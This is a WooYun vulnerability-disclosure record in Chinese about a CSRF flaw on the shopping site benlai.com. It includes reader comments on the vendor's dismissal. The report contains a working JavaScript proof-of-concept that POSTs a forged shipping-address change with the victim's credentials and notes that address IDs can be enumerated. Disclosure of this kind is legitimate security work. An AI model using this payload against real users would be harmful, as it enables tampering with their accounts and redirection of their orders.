{"id": 27678, "wybug_id": "wooyun-2015-0124911", "wybug_title": "本来生活网 csrf一枚", "wybug_corp": "本来生活网", "wybug_author": "路人甲", "wybug_date": "2015-07-06 16:56", "wybug_open_date": "2015-07-09 15:48", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-09：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 本来生活网，修改收货地址，存在CSRF漏洞，可随意修改别人的收货地址。。。。 详细说明：  登录账户A，修改其收货地址，并抓包\n\n查看其收货地址，修改成功：\n\n请求为post，且参数可预测，尝试csrf。构造连接，主要代码;\nxmlhttp.open(\"POST\", \"http://www.benlai.com/UserHome/AddressOpt/.html\", true);\txmlhttp.withCredentials = true;\txmlhttp.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");\txmlhttp.send(\"checkNeighbor=0&AddressCount=2&sysno=1898189&txtBrief=jia1&province=1&city=2&district=10&txtStreet=fgdsgtesghth&txtZip=100000&txtName=woo&txtCell=13200000000&txtPhone1=010&txtPhone2=6841231&txtPhone3=880&chxDefault=on&IsShowAll=1\");\n访问链接\n\n刷新收货地址\n\n地址被成功修改sysno（地址ID号）由纯数字组成，完全可遍历，只要被攻击者不小心点击攻击者伪造的该链接，收货地址便被成功修改。   漏洞证明：  同上   修复方案：  token验证refer   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-09 15:48 厂商回复： 用户只可以修改自己的信息 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-09 16:03 |    \t\tnina \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:43        | 。。。。。。。。。)\t\t \n  晕，厂商是不是不知道啥叫csrf啊    \n     2015-07-09 16:55 |    \t\t外星人 \t\t\t( 普通白帽子  |\t\t\t        Rank:650 漏洞数:139        )\t\t \n  @nina 遇到过很多了，很多都是这么回复的，账号信息只有本人才可以看到。这些厂商都是小白，打酱油的！  @本来生活网 这里是漏洞库，没有什么做不到    \n     2015-07-11 21:10 |    \t\tdarkrerror \t\t\t( 普通白帽子  |\t\t\t        Rank:263 漏洞数:44        )\t\t \n  @nina 乌云不是自动补rank吗，这个也是乌云的厂商啊    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}